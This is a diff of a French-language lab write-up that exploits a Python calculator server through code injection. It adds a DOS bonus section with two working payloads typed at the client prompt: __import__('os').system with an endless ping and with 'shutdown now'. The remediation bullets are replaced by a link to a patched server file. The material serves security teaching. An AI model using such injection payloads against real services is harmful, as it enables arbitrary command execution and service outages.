@@ -11,6 +11,7 @@
   - [1. Reconnaissance](#1-reconnaissance)
   - [2. Exploit](#2-exploit)
   - [3. Reverse shell](#3-reverse-shell)
+  - [4. Bonus : DOS](#4-bonus--dos)
   - [II. Remédiation](#ii-remédiation)
 
 ## 0. Setup
@@ -83,6 +84,8 @@ Nmap done: 4096 IP addresses (869 hosts up) scanned in 246.11 seconds
 
 🌞 **Injecter du code serveur**
 
+![](/img/cowboy.gif)
+
 En lisant le code client non modifié, nous pouvons voir que c'est bien ce code qui verifie ce que nous voulions envoyer au serveur. En mettant donc les matchs de regex en commentaire, nous pouvons maintenant envoyer ce qu'on veut au serveur.
 
 ```python
@@ -149,17 +152,34 @@ tcp   LISTEN 0      1          10.0.3.15:13337      0.0.0.0:*    users:(("python
 tcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*    users:(("sshd",pid=699,fd=3))      
 tcp   LISTEN 0      128             [::]:22            [::]:*    users:(("sshd",pid=699,fd=4)) 
 ```
+## 4. Bonus : DOS
+
+⭐ **BONUS : DOS l'application**
 
 
+Sans faire exprès, nous avons reussi à DOS le serveur en envoyant un ping sans fin, car une fois la commande envoyée, nous ne pouvions plus envoyer de nouvelles commandes.
+```
+$ sudo python3 client.py
+Veuillez saisir une opération arithmétique : __import__('os').system('ping 10.33.70.30')
+```
+
+![](img/shutdown.gif)
+
+Haha shutdown le serveur
+
+```
+$ sudo python3 client.py
+Veuillez saisir une opération arithmétique : __import__('os').system('shutdown now')
+```
 
 ## II. Remédiation
 
 🌞 **Proposer une remédiation dév**
 
-- le code serveur ne doit pas exécuter n'importe quoi
-- il faut préserver la fonctionnalité de l'outil
+
+[Code serveur remédié](Remediations/serv_remedie.py)
 
 🌞 **Proposer une remédiation système**
 
-- l'environnement dans lequel tourne le service est foireux (le user utilisé ?)
-- la machine devrait bloquer les connexions sortantes (pas de reverse shell possible)
+
+![](img/flex.gif)
